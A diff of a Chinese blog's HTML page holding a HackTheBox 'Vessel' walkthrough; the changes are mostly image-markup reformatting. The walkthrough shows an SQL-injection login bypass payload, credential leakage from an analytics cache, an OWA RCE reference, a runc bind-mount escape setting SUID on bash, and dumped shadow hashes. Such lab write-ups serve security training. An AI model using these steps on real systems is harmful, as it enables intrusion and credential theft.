@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;492  10.10.11.178   端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV -Pn 10.10.11.178Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-09-05 2">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;492  10.10.11.178                                                                                                              端口扫描22和80: 12345678">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Vessel - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/09/06/Vessel-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;492  10.10.11.178   端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV -Pn 10.10.11.178Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-09-05 2">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;492  10.10.11.178                                                                                                              端口扫描22和80: 12345678">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022090501.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022090502.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022090503.jpg">
@@ -134,7 +134,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -224,14 +224,28 @@
 </li>
 <li><h2 id="10-10-11-178"><a href="#10-10-11-178" class="headerlink" title="10.10.11.178"></a>10.10.11.178</h2></li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090501.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090501.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.178</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 21:37 CST</span><br><span class="line">Nmap scan report for 10.10.11.178</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 (RSA)</span><br><span class="line">|   256 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d (ECDSA)</span><br><span class="line">|_  256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">|_http-title: Vessel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 110.36 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>根据请求响应信息知道是Nodejs Express：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090502.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090502.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>目录扫描发现dev，继续扫描发现git泄漏：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://10.10.11.178/ --wildcard --exclude-length 26</span><br><span class="line"></span><br><span class="line">/admin                (Status: 302) [Size: 28] [--&gt; /login]</span><br><span class="line">/css                  (Status: 301) [Size: 173] [--&gt; /css/]</span><br><span class="line">/dev                  (Status: 301) [Size: 173] [--&gt; /dev/]</span><br><span class="line">/img                  (Status: 301) [Size: 173] [--&gt; /img/]</span><br><span class="line">/js                   (Status: 301) [Size: 171] [--&gt; /js/]</span><br><span class="line">/logout               (Status: 302) [Size: 28] [--&gt; /login]</span><br><span class="line"></span><br><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://10.10.11.178/dev/ --wildcard --exclude-length 26</span><br><span class="line"></span><br><span class="line">/.git/HEAD            (Status: 200) [Size: 23]</span><br></pre></td></tr></table></figure>
 
@@ -239,9 +253,23 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git-dumper http://10.10.11.178/dev/.git/ git_dump</span><br></pre></td></tr></table></figure>
 
 <p>根据log，发现security fix以及作者相关信息：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090503.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090503.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="security-fix"><a href="#security-fix" class="headerlink" title="security fix"></a>security fix</h2><p>查看代码，发现login修复了sql 注入：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090504.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090504.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 这段代码看起来很安全，但是，典型案例：</p>
 <ul>
 <li>Node.js SQL Injection Guide: Examples and Prevention<br><a href="https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/" target="_blank" rel="noopener">https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/</a></li>
@@ -253,13 +281,34 @@
 <h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>使用文章中的payload绕过登录，进入管理后台：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;password[password]&#x3D;1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090505.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090505.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>分析功能发现新的子域名：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090506.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090506.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="openwebanalytics-vessel-htb"><a href="#openwebanalytics-vessel-htb" class="headerlink" title="openwebanalytics.vessel.htb"></a>openwebanalytics.vessel.htb</h1><p> 新的子域名加入hosts后访问, 需要认证：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.178 vessel.htb openwebanalytics.vessel.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090507.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090507.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>搜索可以找到相关漏洞：</p>
 <ul>
 <li>From Single / Double Quote Confusion To RCE (CVE-2022-24637) – devel0pment.de<br><a href="https://devel0pment.de/?p=2494" target="_blank" rel="noopener">https://devel0pment.de/?p=2494</a></li>
@@ -283,7 +332,14 @@
 </ol>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php </span><br><span class="line"></span><br><span class="line">admin@vessel.htb</span><br><span class="line"><span class="meta">$</span><span class="bash">2y<span class="variable">$10</span><span class="variable">$B1xWod4b9nkPdUFqaaL5LOZJd5Mb</span>/50AmVMTvK5rhDImdh1XWn2U6</span></span><br><span class="line">temp_passkey : 7e0db1883aff3f509809dc788118d136</span><br><span class="line">api_key : a390cc0247ecada9a2b8d2338b9ca6d2</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090508.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090508.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>得到的hash破解不出来，但有一个temp_passkey，可以用于重置密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersChangePassword</span><br></pre></td></tr></table></figure>
 
@@ -292,14 +348,42 @@
 <li>删除隐藏属性，将 temp_passkey 粘贴到字段中，然后更改密码</li>
 <li>现在，您应该可以<code>admin</code>使用新设置的密码登录帐户了</li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090509.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090510.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090509.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090510.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>可以根据文章手工，也可以直接脚本打到www-data shell:</p>
 <ul>
 <li>Lay0us1/CVE-2022-24637: Unauthenticated RCE in Open Web Analytics (OWA) 1.7.3<br><a href="https://github.com/Lay0us1/CVE-2022-24637" target="_blank" rel="noopener">https://github.com/Lay0us1/CVE-2022-24637</a></li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090511.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090512.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090511.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090512.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="passwordGenerator"><a href="#passwordGenerator" class="headerlink" title="passwordGenerator"></a>passwordGenerator</h1><p>/home/steven目录下有几个文件，下载下来分析：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/home/steven/passwordGenerator</span><br><span class="line">/home/steven/.notes/screenshot.png</span><br><span class="line">/home/steven/.notes/notes.pdf</span><br></pre></td></tr></table></figure>
 
@@ -331,9 +415,23 @@
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>ethan用户ssh登录，得到user flag：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh ethan@10.10.11.178</span><br><span class="line">b@mPRNSVTjjLKId1T</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090513.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090513.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>运行linpeas，发现runc,搜索能发现一个相关漏洞：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090514.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090514.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <ul>
 <li>RunC Privilege Escalation - HackTricks<br><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation" target="_blank" rel="noopener">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation</a></li>
 <li>cr8escape: New Vulnerability in CRI-O Container Engine (CVE-2022-0811)<br><a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/" target="_blank" rel="noopener">https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/</a></li>
@@ -346,7 +444,14 @@
 <p>Session1:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/miao &amp;&amp; cd /tmp/miao</span><br><span class="line">runc spec --rootless</span><br><span class="line">mkdir rootfs</span><br><span class="line">nano config.json</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在mount section里面添加内容：</span></span><br><span class="line">&#123;</span><br><span class="line">    "type": "bind",</span><br><span class="line">    "source": "/",</span><br><span class="line">    "destination": "/",</span><br><span class="line">    "options": [</span><br><span class="line">        "rbind",</span><br><span class="line">        "rw",</span><br><span class="line">        "rprivate"</span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行，得到只读root：</span></span><br><span class="line">runc --root /tmp/miao run alpine</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090515.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090515.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>Session2:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e '#!/bin/sh\nchmod +s /usr/bin/bash' &gt; /tmp/miao/e.sh &amp;&amp; chmod +x /tmp/miao/e.sh</span><br></pre></td></tr></table></figure>
 
@@ -360,7 +465,14 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">ulimit</span> -c unlimited</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tail -f /dev/null &amp;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ps</span></span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">      1 pts/0    00:00:00 sh</span><br><span class="line">     11 pts/0    00:00:00 tail</span><br><span class="line">     12 pts/0    00:00:00 ps</span><br><span class="line"><span class="meta">#</span><span class="bash"> bash -i</span></span><br><span class="line">bash: /root/.bashrc: Permission denied</span><br><span class="line">root@runc:/# kill -SIGSEGV 11</span><br><span class="line">root@runc:/# ps</span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">      1 pts/0    00:00:00 sh</span><br><span class="line">     13 pts/0    00:00:00 bash</span><br><span class="line">     15 pts/0    00:00:00 ps</span><br><span class="line">root@runc:/#</span><br></pre></td></tr></table></figure>
 
 <p><code>session 2</code>中，检查该<code>s</code>位是否已分配给<code>usr/bin/bash</code>，然后提升为有效root：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090516.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090516.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$9AU197eAAajcv6DO$YOGX5f111bLxtIqVgPKGg3QmWiWIRVmYk3Gkj0BwFVb9K0BkAnJEHaRJElahiQGxtDnvjPI9XqPMkI7YrE60A1:19101:0:99999:7:::</span><br><span class="line">ethan:$6$7ZmNCkavGVnqDtRI$DXwHR.p1AXlIwDsoi20wpd57ZQL4doguuNxh4XY.vzX8wwnD8uz5Gz2AG6tWDEDfsO8CQFOYgEHg&#x2F;riNHOJ4k0:19099:0:99999:7:::</span><br><span class="line">steven:$6$Czg9.c1hcgYo7ON4$ogez7L7bCGFTURA4LcPv8A5CWdGufpkI4QHhSfKtZUMq2vzT7hKP&#x2F;.DSDRXSQBWzgvVTnIpY&#x2F;jG.zYFIgWFXD.:19099:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
